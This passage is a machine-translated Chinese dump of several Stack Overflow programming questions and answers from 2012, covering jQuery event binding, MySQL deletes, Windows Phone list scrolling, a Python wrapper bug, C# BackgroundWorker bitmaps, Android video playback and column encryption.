    public void setExceptionMsg(String exceptionMsg) {
        this.exceptionMsg = exceptionMsg;
    }
} 
```

我不知道出了什么问题。所以如果有人能解释我，我将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T08:50:37.810

我认为错误消息非常清楚 -`ExceptionHanlder`对于此异常，您应该只注释一个方法。顺便说一句，我认为这两种方法都不是一个好的选择。

`exceptionMsg`另一个注意事项 -你不应该有一个字段`GenericException`- 使用继承`message` 的字段。

# jquery - 如何在动态添加的另一个元素中添加“on”？

> ID：14097780
> 
> 赞同：1
> 
> 时间：2012-12-31T05:24:42.583
> 
> 标签：jquery

我有一个 DOM 元素 #article，我正在使用以下代码加载登录表单：

```
$('#loginLink')
.click(function () {
   var $link = $(this);
   var href = $link.attr('data-href');
   $('#article').load(href);
}
return false;
}); 
```

登录表单如下所示：

```
<article id="article">
<section class="form" id="loginForm">
<form action="/User/Account/Login" method="post" novalidate="novalidate">
..... 
```

如何在表单提交中附加一些操作？目前我有这个代码：

```
$("loginForm").on("submit", function () {
   var $form = $(this); 
```

我知道这不会起作用，因为稍后会添加 loginForm。我需要的是一种在单击 loginForm 提交时附加到 #article 的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T05:26:46.943

[`load`](http://api.jquery.com/load/)有一个回调，一旦加载内容就会触发，所以：

```
$('#article').load(href, function() {
    // Hook up the new elements here
}); 
```

> 我需要的是一种在单击 loginForm 提交时附加到 #article 的方法。

因此，在`load`回调中，您将挂钩`submit`表单，在事件处理程序中，您将做任何您想做的事情`#article`，例如：

```
$('#article').load(href, function() {
    $("#loginForm").on("submit", function() {
        // Code here to do further things with #article
    });
}); 
```

（当然，除非表单有一个`target`打开一个新窗口的表单，或者您取消标准表单提交并以另一种方式发送数据，否则该页面将被表单提交完全拆除并被服务器生成的页面替换，所以你所做的更改`#article`不会持续很长时间。但我猜你正在阻止这种情况，或者你所做的更改只是在页面被表单提交撕毁之前。）

* * *

旁注：这可能只是问题中的一个错字，但你有`$("loginForm")`而不是`$("#loginForm")`.

# mysql - MySQL - 根据从表 X 中删除的结果从表 Y 中删除

> ID：14097782
> 
> 赞同：1
> 
> 时间：2012-12-31T05:25:13.590
> 
> 标签：mysql, sql, join

假设我有两张桌子：

```
tableA
-------
type   (varchar)
name   (varchar)

tableB
-------
name   (varchar)
... 
```

我想从`tableA`哪里删除所有记录`type='foo'`。我可以这样做：

```
$STH=$DBH->prepare("DELETE FROM tableA WHERE type = :t");
$STH->bindParam(':t','foo');
try {
    $STH->execute();
} catch(PDOException $e) {
    echo $e->getMessage();
} 
```

然后，我想记下`name`我删除的每条记录中的字段，`tableA`并使用它来删除`tableB`具有这些名称的任何记录。我怎样才能做到这一点？

我想要一些等效的东西，`$DBH->lastInsertId();`除了它将`name`删除记录中的所有字段传回。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T05:29:46.933

您可以加入两个表并对它们执行删除，例如

```
DELETE  a, b
FROM    table1 a
        INNER JOIN table2 b
          ON a.name = b.name
WHERE   a.type = 'foo' 
```

*   [SQLFiddle 演示链接](http://sqlfiddle.com/#!2/22f21b/1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:31:16.403

在 JW 的回答之上，如果这是您想要做的永久性事情（即数据是非规范化的），您可以将 a 添加`CASCADE DELETE`到`tableB.name`该 references `tableA.name`。这要求您使用支持外键的数据库引擎（即 InnoDB）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:36:11.983

最后一个选项是触发器使用，这里是手动：http: [//dev.mysql.com/doc/refman/5.0/en/triggers.html](http://dev.mysql.com/doc/refman/5.0/en/triggers.html)但JW的回答对你来说是优雅和好的解决方案

# xaml - LongListSelector 不滚动

> ID：14097783
> 
> 赞同：5
> 
> 时间：2012-12-31T05:25:22.733
> 
> 标签：xaml, windows-phone-8, longlistselector

我无法让我的长列表选择器正常工作。当列表高于屏幕时，长列表选择器保持静态，我无法滚动查看所有项目。

有什么想法吗？

```
<phone:PivotItem Header="{Binding Path=LocalizedResources.ApplicationsHeader, Source={StaticResource LocalizedStrings}}" x:Name="applicationsPivotItem">
    <Grid x:Name="applications" Grid.Row="1">
        <phone:LongListSelector x:Name="MainLongListSelector" ItemsSource="{Binding Items}" SelectionChanged="MainLongListSelector_SelectionChanged">
            <phone:LongListSelector.ItemTemplate>
                <DataTemplate>
                    <StackPanel>
                        <TextBlock Text="{Binding LineOne}" TextWrapping="Wrap" Style="{StaticResource PhoneTextExtraLargeStyle}"/>
                        <TextBlock Text="{Binding LineTwo}" TextWrapping="Wrap" Margin="12,-6,12,0" Style="{StaticResource PhoneTextSubtleStyle}"/>
                    </StackPanel>
                </DataTemplate>
            </phone:LongListSelector.ItemTemplate>
        </phone:LongListSelector>
    </Grid>
</phone:PivotItem> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-31T06:16:28.380

固定网格的高度

```
<Grid x:Name="applications" Grid.Row="1" Height="400">
...long list code...
</Grid> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-07-31T22:21:01.007

我有一个类似的问题，我的全景项目定义如下：

```
 <phone:PanoramaItem>
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"/>
                    </Grid.RowDefinitions>

                    <phone:LongListSelector x:Name="SpeciesList" Grid.Row="0">
                        <phone:LongListSelector.ItemTemplate>
                            <DataTemplate>
                                <StackPanel Margin="0,-6,0,12">
                                    <TextBlock Text="{Binding PrimaryName}"/>
                                </StackPanel>
                            </DataTemplate>
                        </phone:LongListSelector.ItemTemplate>
                    </phone:LongListSelector>
                </Grid>
            </phone:PanoramaItem> 
```

通过将 RowDefinition 更改为使用 * 而不是 Auto，我的滚动问题得到了解决！如下所示。

```
 <Grid.RowDefinitions>
                        <RowDefinition Height="*"/>
                    </Grid.RowDefinitions> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-07T01:31:41.307

我遇到了 LongListSelector 不滚动的相同问题。最后是在 LongListSelector 中设置的 OpacityMask="White"[根据这个问题导致了问题](https://stackoverflow.com/questions/17408962/strange-behaviour-with-longlistselector-and-opacity-on-windows-phone-8)

同样根据 Mattias，我不必设置特定的高度，只要网格 RowDefinition 设置为 *。

# python - Python - 当我检查我返回的对象不是 NoneType 时，为什么这个方法返回 NoneType？

> ID：14097784
> 
> 赞同：0
> 
> 时间：2012-12-31T05:25:26.477
> 
> 标签：python

我有代码，其中所有对象都来自一个基础对象，我不打算直接实例化它。在`__init__()`我的基础对象的方法中，我试图执行一些魔法——我试图装饰或包装正在初始化的对象的每个方法。但是当我调用结果方法时，我得到的结果让我感到困惑。这是隔离问题的示例代码：

```
class ParentObject(object):
    def __init__(self):
        self._adjust_methods(self.__class__)

    def _adjust_methods(self, cls):
        for attr, val in cls.__dict__.iteritems():
            if callable(val) and not attr.startswith("_"):
                setattr(cls, attr, self._smile_warmly(val))
        bases = cls.__bases__
        for base in bases:
            if base.__name__ != 'object':
                self._adjust_methods(base)

    def _smile_warmly(self, the_method):
        def _wrapped(cls, *args, **kwargs):
            print "\n-smile_warmly - " +cls.__name__
            the_method(self, *args, **kwargs)
        cmethod_wrapped = classmethod(_wrapped)
        return cmethod_wrapped

class SonObject(ParentObject):
    def hello_son(self):
        print "hello son"

    def get_sister(self):
        sis = DaughterObject()
        print type(sis)
        return sis

class DaughterObject(ParentObject):
    def hello_daughter(self):
        print "hello daughter"

    def get_brother(self):
        bro = SonObject()
        print type(bro)
        return bro

if __name__ == '__main__':
    son = SonObject()
    son.hello_son()

    daughter = DaughterObject()
    daughter.hello_daughter()

    sis = son.get_sister()
    print type(sis)
    sis.hello_daughter()

    bro = sis.get_brother()
    print type(bro)
    bro.hello_son() 
```

然而，程序崩溃了——该行`sis = son.get_sister()`导致`sis`对象的类型为 NoneType。这是输出：

```
-smile_warmly - SonObject
hello son

-smile_warmly - DaughterObject
hello daughter

-smile_warmly - SonObject
<class '__main__.DaughterObject'>
<type 'NoneType'>
Traceback (most recent call last):
  File "metaclass_decoration_test.py", line 48, in <module>
    sis.hello_daughter()
AttributeError: 'NoneType' object has no attribute 'hello_daughter' 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T05:29:26.753

尝试改变：

```
 def _wrapped(cls, *args, **kwargs):
        print "\n-smile_warmly - " +cls.__name__
        the_method(self, *args, **kwargs) 
```

至

```
 def _wrapped(cls, *args, **kwargs):
        print "\n-smile_warmly - " +cls.__name__
        return the_method(self, *args, **kwargs) 
```

您的`_wrapped`方法正在调用正在包装的方法，但不返回该方法的返回值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:35:41.533

好吧，我什至不想触及这段代码中发生的疯狂，但您的错误具体是因为您的“装饰器”没有从包装函数返回任何内容：

```
def _smile_warmly(self, the_method):
    def _wrapped(cls, *args, **kwargs):
        print "\n-smile_warmly - " +cls.__name__
        return the_method(self, *args, **kwargs) # return here
    cmethod_wrapped = classmethod(_wrapped)
    return cmethod_wrapped 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T06:35:02.387

@PaulMcGuire 的回复中缺少返回是该错误的原因。

在更高的层次上，您似乎正在尝试通过继承来做可能更“常见”（这几乎不是一种常见的方法）通过元类完成的事情。也许[像这个关于元类的讨论](http://www.ibm.com/developerworks/linux/library/l-pymeta/index.html)会为你指明一个更易于管理的方向。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-31T05:38:32.917

问题是您正在包装类的*所有*方法，包括`get_sister`. 您可以按照@Paul McGuire 的建议进行操作并将其添加`return`到包装器中，但这意味着当您调用时会打印“微笑”消息`son.get_sister`，这可能不是您想要的。

相反，您可能需要做的是在内部添加一些逻辑`_adjust_methods`来精确决定要包装哪些方法。除了检查`callable`and`not startswith('_')`之外，您还可以为您想要或不想用`smile`行为包装的命名约定。但是，您这样做的次数越多，与仅手动装饰您要装饰的方法相比，自动装饰对您的好处就越少。有点难以理解为什么要使用显然要使用的结构（所有类方法，包装所有内容等）。也许如果你在这里解释你的最终目标是什么，有人可以建议一个更直接的设计。

此外，即使您添加`return`或额外的包装逻辑，您仍然会遇到我在另一个问题中提到的问题：由于您进行包装`__init__`，每次实例化一个类时都会发生这种情况，所以您将继续添加越来越多的包装器。这就是为什么我在那里建议您应该使用类装饰器，或者，如果必须的话，使用元类。弄乱类属性（包括方法）`__init__`不是一个好主意，因为它们会一遍又一遍地弄乱，对于您创建的每个实例一次。

# c# - 如何从 asp.net 处理程序返回 404 错误？

> ID：14097785
> 
> 赞同：11
> 
> 时间：2012-12-31T05:26:18.113
> 
> 标签：c#, asp.net, error-handling

我创建了一个用于下载文件的处理程序。如果文件不存在或用户无权下载该特定文件，我想返回 404 错误。

可能吗？如果是，如何？示例代码将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-07-14T16:35:17.893

我不确定我们是否有足够的信息来说明您要做什么。您使用的是 REST API 吗？如果您使用的是 WebApi，那将非常简单：

```
public IHttpActionResult DownloadFile(string fileName)
{
   if (!File.Exists(fileName))
   {
      return NotFound();
   }

   // Do something

   return Ok(yourFile);
} 
```

# php - 如何使用 jquery 使链接无效

> ID：14097789
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:26:38.150
> 
> 标签：php, jquery, html

我在这里有 jQuery 网站。我有 4 个带有 in`ul`标签的链接。在此链接中，我需要停用链接但必须显示。见下文：

```
<div class="over hide"  id="waterSecondOver">
   <a href="javascript:void(0);" class="current" id="chancingOverView">Overview</a>
   <a href="javascript:void(0);" id="chancingLocalarea">Local Area</a>
   <a href="javascript:void(0);" id="chancingFloorPlan">Floor Plans</a>
   <a href="javascript:void(0);" id="chancingallery"  >Gallery</a>
</div> 
```

我在上面的链接上有一个点击功能（除了第四个，即画廊）。查看代码

```
JQR('#waterSecondOver a').click(function() { 

    // my code

}); 
```

在这里我需要显示图库链接，但是单击图库时没有任何反应（即必须是非活动链接或者我说它的功能只是将链接显示为“图库”）

我认为很清楚。请帮我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:28:36.973

```
JQR('#waterSecondOver a').click(function(event) { 

event.preventDefault();

   }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T07:21:21.360

我会简单地更改锚的类（让我们说类 =“活动”），并且每次点击时检查那个“活动”类。如果课程是“活跃的”，什么也不做。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:31:51.047

不要将锚标签中的 href 设置为`javascript:void(0);`- 这很混乱，因为它是不必要的重复。使用 jQuery，可以`return false;`在事件回调中使用，以避免默认点击事件将您带到新页面或当前页面。虽然这是最简单的方法，但并不总是最好的。有关更多信息，请参阅这篇文章：

[http://fuelyourcoding.com/jquery-events-stop-misusing-return-false/](http://fuelyourcoding.com/jquery-events-stop-misusing-return-false/)

但是您绝对不想`href`手动设置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T07:04:54.287

为了简单起见，您可以这样做...

```
JQR('#waterSecondOver a').click(function(event) { 

    if(JQR(this).attr('id') == "chancingallery"){
        // inactive all links except the one you dont want
      }else{
        // whatever you need....
    }

}); 
```

# gallery - 我需要帮助使用 html 和 javascript 制作视频/照片库

> ID：14097792
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:27:13.053
> 
> 标签：gallery, photo

我知道以前有人问过这个问题，但是我找不到任何可以完全帮助我的线程。我有点菜鸟，但我知道我的方式。这是我到目前为止所拥有的：HTML 文件 [https://dl.dropbox.com/u/9757676/Website%20Stuff/Website.html](https://dl.dropbox.com/u/9757676/Website%20Stuff/Website.html) Javascript 文件： [https ://dl.dropbox.com/u/9757676/Website%20Stuff /script.js](https://dl.dropbox.com/u/9757676/Website%20Stuff/script.js)

（它不会让我发布代码）

有没有更简单的方法可以做到这一点，也许将所有图像放入一个数组中？我还需要帮助制作下一个和后退按钮，也许一个问题可以解决另一个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:31:46.513

检查 jQuery 工具：http: [//jquerytools.org/demos/tabs/slideshow.html](http://jquerytools.org/demos/tabs/slideshow.html)。它有很多很好的插件可以帮助你。

# linux - 在 Linux 上调用 Python IDLE

> ID：14097795
> 
> 赞同：6
> 
> 时间：2012-12-31T05:27:34.433
> 
> 标签：linux, python-idle

我正在尝试建立一个 Python 开发环境。我在 Linux mint14 上运行 Python 2.7.3。我下载了 IDLE 并安装了它。干净的安装和 Python 运行得很好。

那么如何调用 IDLE 呢？我的路径中没有 IDLE：`which idle`什么都不返回。`man idle`返回与编辑器有关的任何内容。/usr/lib 或 /usr/local/lib 中没有任何内容。在 Python 解释器中调用`idle()`不起作用。调用`python`会调出一个 shell，而不是 IDLE。Linux 中没有 IDLE 的菜单项。Python 找不到名为 IDLE 的导入库。查阅了 3 本书 O'Reilly 的书籍，但没有提及在 Linux 中调用 IDLE。Python 的 YouTube 视频支持 Windows，而不是 Linux。迄今为止，网络搜索一直不成功。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-31T05:47:51.397

我对`lint`自己不熟悉，但由于它声称是基于 Debian 的，请尝试安装该`idle`软件包：

```
sudo apt-get install idle 
```

这应该为已安装的 Python 版本引入所有适当的包。然后你应该能够开始空闲：

```
idle 
```

在终端窗口中。

# c# - 如何将 BitmapImage 引用传递给 BackgroundWorker.DoWork

> ID：14097806
> 
> 赞同：0
> 
> 时间：2012-12-31T05:29:01.467
> 
> 标签：c#, windows-phone-7, backgroundworker, pass-by-reference

我有一个从资源流构造的 BitmapImage。我需要将它发送到后台工作线程进行一些后期处理。但似乎工作线程无法访问位图数据并在我的 LoadImage 第一行中获取**System.UnauthorizedAccessException 。**如何解决这个问题？我还需要将处理后的位图传输回 UI (XAML) 以显示。如何正确地做到这一点？

```
 ImageLoader.RunWorkerAsync(albumArtImage);

    private void LoadImage(object sender, DoWorkEventArgs e)
    {
        WriteableBitmap wb = new WriteableBitmap((BitmapImage)e.Argument);
        wb.Resize(AppWidth, AppHeight, WriteableBitmapExtensions.Interpolation.Bilinear);
        var wb2 = WriteableBitmapExtensions.Convolute(wb, WriteableBitmapExtensions.KernelGaussianBlur3x3);            
        e.Result = wb2;
    }

    private void LoadImageCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
        AlbumBackground.ImageSource = (WriteableBitmap)e.Result;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T12:48:25.520

WriteableBitmap 需要从 UI 线程调用。这只是该实用程序的一个限制，您无法绕过。

来自 MSDN：

> WriteableBitmap 类使用两个缓冲区。后台缓冲区在系统内存中分配并累积当前未显示的内容。前端缓冲区分配在系统内存中，包含当前显示的内容。渲染系统将前端缓冲区复制到显存中以供显示。
> 
> 两个线程使用这些缓冲区。用户界面 (UI) 线程生成 UI，但不将其呈现到屏幕上。UI 线程响应用户输入、计时器和其他事件。一个应用程序可以有多个 UI 线程。渲染线程组合并渲染来自 UI 线程的更改。每个应用程序只有一个渲染线程。
> 
> UI 线程将内容写入后台缓冲区。渲染线程从前端缓冲区读取内容并将其复制到显存。通过更改的矩形区域跟踪对后台缓冲区的更改。

[http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx)

**BackgroundWorker 的替代方案：**

无法绕过您需要在 UI 线程上执行此操作的事实。但是您可以将它推到队列的末尾，这样它可能不会被用户注意到。

尝试这样的事情：

```
public static void RunDelayedOnUiThread(Action action)
{
     Deployment.Current.Dispatcher.BeginInvoke(() =>
     {
         var timer = new DispatcherTimer 
                     { 
                         Interval = TimeSpan.FromMilliseconds(1) 
                     };
         timer.Tick += (sender, args) =>
         {
             timer.Stop();
             action();
         };

         timer.Start();
     });
} 
```

这应该足以让您的图像处理（在本例中为传递的操作）将放在等待在 UI 线程上处理的队列的末尾。您的图像处理在工作时仍会阻塞 UI 线程，但至少应该先完成其他所有工作。

这个怎么运作：

当您调用 BeginInvoke 时，您的操作将放置在调度程序队列的末尾，以便在 UI 线程从当前正在执行的操作（运行您的代码）中释放出来时运行。但是因为您可以再次调用 BeginInvoke（一次又一次），然后您的图像处理会阻塞调度程序队列中的其他内容，所以我们想再次将其放在后面。这就是 DispatcherTimer 的用武之地。来自 MSDN：

> 定时器不能保证在时间间隔发生时准确执行，但可以保证在时间间隔发生之前不会执行。这是因为 DispatcherTimer 操作像其他操作一样放置在 Dispatcher 队列中。DispatcherTimer 操作何时执行取决于队列中的其他作业及其优先级。

所以我们给它的一毫秒间隔应该足以将它推回到队列的末尾。

在 Windows Phone 7 上，这可能仍会阻止某些触摸事件，但至少您不会阻止页面呈现。

在 Windows Phone 8 上，Panorama、Pivo​​t 和 LongListSelector 都响应非 UI 线程上的输入，因此您在那里会更安全一些。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T01:43:41.190

这对我有用。我在将位图传递给 backgroundWorker 之前冻结了位图，并且没有引发异常。

```
BackgroundWorker bw = new BackgroundWorker();
BitmapSource bmpCanvas;
BitmapSource bmpRef;

List<object> arg = new List<object>();
arg.Add(bmpCanvas);
arg.Add(bmpRef);
bmpCanvas.Freeze();
bmpRef.Freeze();

bw.RunWorkerAsync(arg); 
```

当我在 backgroundworker 中完成位图时，我冻结了位图。

```
void bw_DoWork(object sender, DoWorkEventArgs e)
{
   List<object> argu = e.Argument as List<object>;

   BitmapSource bCanvas = (BitmapSource)argu[0];
   BitmapSource bref = (BitmapSource)argu[1];
   // doing something with those images...
   bCanvas.Freeze();
   e.Result = bCanvas;
} 
```

我更新了 RunWorkerCompleted 中的位图图像。

```
void bw_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
{
   BitmapSource bmpCanvas = (BitmapSource)e.Result;

   image.Source = bmpCanvas;
} 
```

[http://msdn.microsoft.com/en-us/library/ms750509.aspx](http://msdn.microsoft.com/en-us/library/ms750509.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-18T08:48:56.073

我将不得不不同意位图修改是一个仅 UI 的过程。我已经实现了一些代码（可能太长而无法发布），这些代码计算单独后台工作程序中单独位图的修改参数，在计算完成时将数据存储在一些数组中（用于像素分配），并将一些布尔值设置为“while”和“if”开关。在另一个 BGW 中，每个要处理的位图一个，我有一个循环等待计算完成布尔值触发。触发时，辅助工作者从数组中复制结果，然后重新启动计算线程以开始计算下一帧……（我提到这是动画吗？？）。这些 BGW 然后继续使用 tempbit.SetPixel(x,y,color) 将复制的参数应用于临时位图（每个原始位图一个） //注意：（可能有一种更有效的方法可以使用......）。一旦位图被更新，更多的布尔开关被抛出（一直在计算 BGW 在下一帧开始运行）。然后在最终的 BGW 上，我实现代码以等待每个单独的临时位图更新。当他们这样做时，我复制位图，并重新启动图像更新 BGW（这个布尔结构防止任何对象重叠）。复制所有图像后，我合并图像，然后更新图片框。图像然后重新启动循环（这将需要更多布尔逻辑和 goto 语句或重新启动异步中继方法）。所以基本上，只要不允许两个 backgroundworker 对象访问共享的第三个对象，就不会抛出异常。更多的布尔开关被抛出（一直在计算 BGW 在下一帧开始运行）。然后在最终的 BGW 上，我实现代码以等待每个单独的临时位图更新。当他们这样做时，我复制位图，并重新启动图像更新 BGW（这个布尔结构防止任何对象重叠）。复制所有图像后，我合并图像，然后更新图片框。图像然后重新启动循环（这将需要更多布尔逻辑和 goto 语句或重新启动异步中继方法）。所以基本上，只要不允许两个 backgroundworker 对象访问共享的第三个对象，就不会抛出异常。更多的布尔开关被抛出（一直在计算 BGW 在下一帧开始运行）。然后在最终的 BGW 上，我实现代码以等待每个单独的临时位图更新。当他们这样做时，我复制位图，并重新启动图像更新 BGW（这个布尔结构防止任何对象重叠）。复制所有图像后，我合并图像，然后更新图片框。图像然后重新启动循环（这将需要更多布尔逻辑和 goto 语句或重新启动异步中继方法）。所以基本上，只要不允许两个 backgroundworker 对象访问共享的第三个对象，就不会抛出异常。并重新启动图像更新 BGW（此布尔结构防止任何对象重叠）。复制所有图像后，我合并图像，然后更新图片框。图像然后重新启动循环（这将需要更多布尔逻辑和 goto 语句或重新启动异步中继方法）。所以基本上，只要不允许两个 backgroundworker 对象访问共享的第三个对象，就不会抛出异常。并重新启动图像更新 BGW（此布尔结构防止任何对象重叠）。复制所有图像后，我合并图像，然后更新图片框。图像然后重新启动循环（这将需要更多布尔逻辑和 goto 语句或重新启动异步中继方法）。所以基本上，只要不允许两个 backgroundworker 对象访问共享的第三个对象，就不会抛出异常。

用外行的话来说，我有单独的 BGW 来处理单独的任务，并实现逻辑以防止任何线程重叠。这仍然允许 BGW 类的异步优势，而没有跨线程和忙检查的大惊小怪。

快乐编码！

# database - 数据库表 - 是否解耦？

> ID：14097807
> 
> 赞同：0
> 
> 时间：2012-12-31T05:29:03.480
> 
> 标签：database

创建存储大量与实体（例如用户）相关的数据的表还是创建许多表来存储所述数据更好？

例如：

用户表

*   姓名
*   电子邮件
*   订阅 ID
*   电子邮件通知
*   权限

或者

用户表

*   姓名
*   电子邮件

订阅表

*   用户身份
*   订阅号

通知表

*   用户身份
*   收到？

... ETC

请同时考虑其中的代码，否则我会发布到 ServerVault。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:36:01.747

从关系设计的角度来看，重要的是您所针对的正常形式。一般来说，如果“列”需要多个值（subscription_id1、subscription_id2 等），那么它是一个重复组，这将向您表明它需要移动到相关表中。您提供了非常通用的表格和列注释，但是从您将“电子邮件通知”和“权限”命名为复数这一事实中得到提示，我将假设这些需要相关表格。

# c# - 在 C# 上执行查询时出错

> ID：14097810
> 
> 赞同：1
> 
> 时间：2012-12-31T05:29:28.613
> 
> 标签：c#, mysql, sql

我有问题。我想使用这个 C# 在我的 mysqldatabase 上存储数据

```
private void btnSaveFilm_Click(object sender, EventArgs e)
    {
        try 
        {
            MySqlConnection conn = new MySqlConnection(connection.mysqlconnectionbuilder());
            conn.Open();
            MySqlCommand cmd = conn.CreateCommand();
            cmd.CommandText = "INSERT INTO film(judul,genre,asal,kondisi)"
                + "VALUES(@judul,@genre,@asal,@kondisi)";
            cmd.CommandType = CommandType.Text;
            cmd.Parameters.AddWithValue("@judul", textBoxJudul.Text);
            cmd.Parameters.AddWithValue("@genre", category(comboBoxGenre.SelectedValue.ToString()).ToString());
            cmd.Parameters.AddWithValue("@asal", asal(comboBoxAsal.SelectedValue.ToString()).ToString());
            cmd.Parameters.AddWithValue("@kondisi", checkedStatus());
            cmd.ExecuteNonQuery();
            conn.Close();
        }
        catch(Exception exe) 
        { 
            Console.Write("Error on Save Film : " + exe.ToString() + "\n" +exe.Message);
        }

    } 
```

但它显示错误 System.NullReferenceException: Object reference not set to an instance of an object。

第 40 行的错误：

```
 cmd.Parameters.AddWithValue("@genre",kategori(comboBoxGenre.SelectedValue.ToString()).ToString()); 
```

如何解决？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T05:35:51.070

将您的代码重构为此，使用`using`语句，

```
string connString = connectionmysqlconnectionbuilder();
using (MySqlConnection conn = new MySqlConnection(connString)
{
    using (MySqlCommand cmd = new MySqlCommand())
    {
        cmd.Connection = conn;
        cmd.CommandText = @"INSERT INTO film(judul,genre,asal,kondisi) 
                             VALUES(@judul,@genre,@asal,@kondisi)";
        cmd.Parameters.AddWithValue("@judul", textBoxJudul.Text);
        cmd.Parameters.AddWithValue("@genre", kategori(comboBoxGenre.Text).ToString());
        cmd.Parameters.AddWithValue("@asal", asal(comboBoxAsal.Text).ToString());
        cmd.Parameters.AddWithValue("@kondisi", checkedStatus());
        try
        {
            comm.Open();
            cmd.ExecuteNonQuery();
        }
        catch(MySqlException ex)
        (
            Console.WriteLine(ex.ToString());
        )
    }
} 
```

你也可以使用

```
comboBoxGenre.Text instead of comboBoxGenre.SelectedValue 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:43:44.547

可能有两个原因：

1.comboBoxGenre.SelectedValue 将为空

2.kategori() 将返回 null

您可以通过使用`Convert.ToString()`而不是处理空错误`variable.toString()`

所以**也将它用于其他行**

```
cmd.Parameters.AddWithValue("@genre", Convert.ToString(kategori(Convert.ToString(comboBoxGenre.SelectedValue)))); 
```

# java - 在 Android 中从服务器播放 mp4 视频时出错

> ID：14097816
> 
> 赞同：0
> 
> 时间：2012-12-31T05:30:36.137
> 
> 标签：java, android, video-streaming, android-videoview

1.我使用以下代码从服务器播放视频。
2.但是显示错误sorry，视频无法播放。

```
url=bundle.getString("url");
myVideoView = (VideoView)findViewById(R.id.myvideoview);   
myVideoView.setVideoURI(Uri.parse(url));
myVideoView.requestFocus();
myVideoView.setOnPreparedListener(new OnPreparedListener() 
{
         public void onPrepared(MediaPlayer mp) {
                    progressDialog.dismiss();
                    myVideoView.start();
            }
 }); 
```

请帮助我如何在 android 中流式传输 mp4 视频。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:36:30.000

请尝试以下代码

```
String path="http://www.ted.com/talks/download/video/8584/talk/761";
String path1="http://commonsware.com/misc/test2.3gp";

Uri uri=Uri.parse(path1);

VideoView video=(VideoView)findViewById(R.id.VideoView01);
video.setVideoURI(uri);
video.start(); 
```

从“path1”开始，它是一个轻量级的小视频流，然后尝试“path”，它比“path1”分辨率更高，完美的手机分辨率。从[https://stackoverflow.com/a/2659346/1218762得到答案](https://stackoverflow.com/a/2659346/1218762)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:45:21.627

```
 mVideoView = (VideoView) findViewById(R.id.surface_view);
 mVideoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() +"/"+R.raw.documentariesandyou));
 mVideoView.setMediaController(new MediaController(this));
 mVideoView.requestFocus(); 
```

> 将您的 .mp4 视频放入 raw 文件夹

# java-me - 为什么这行 Java 代码会导致我的应用程序退出？

> ID：14097817
> 
> 赞同：0
> 
> 时间：2012-12-31T05:30:56.857
> 
> 标签：java-me

为什么这行代码不起作用？

```
int display_width = display.getCurrent().getWidth(); 
```

当我启动我的 midlet 时，我看到了这个错误：异常。应用程序意外退出。联系应用程序提供商解决问题。0。

为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:38:10.200

这里的某些东西可能会引发异常，但库将其隐藏在用户友好的错误消息后面。

我的猜测是`display.getCurrent()`返回 null，所以`getWidth()`原因是`NullPointerException`. 尝试这个：

```
Display myDisplay = display.getCurrent();
System.out.println(myDisplay);
int display_width = myDisplay.getWidth(); 
```

请注意，无论返回值的类型是什么，您都需要替换`Display`类。`display.getCurrent()`

或者，更好的是，您可以尝试捕获异常：

```
try {
    int display_width = display.getCurrent().getWidth();
} catch (RuntimeException e) {
    e.printStackTrace();
    throw e;
} 
```

# mysql - 如何加密 mysql 表中的电子邮件列？

> ID：14097826
> 
> 赞同：2
> 
> 时间：2012-12-31T05:32:04.027
> 
> 标签：mysql, ruby-on-rails, ruby-on-rails-3, security, encryption

我有一个使用 mysql 的 rails 3 应用程序。该应用程序将客户的电话号码和电子邮件存储在一个表格中。我想加密字段而不是将它们存储为普通和直接的值。这样，即使他/她可以访问数据库，该表对任何人都无用。

但是还有另一个问题。使用电子邮件和电话号码对记录进行大量查询，并进行索引。如何在不影响性能的情况下实现字段加密，并且仍然能够轻松搜索和匹配？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T05:48:46.343

首先，请记住，如果有人获得足够的访问权限来读取您的代码文件，他可能会获得您的解密例程和密钥——您的加密只会保护您免受访问数据库的攻击者的侵害，而不会其他任何东西。

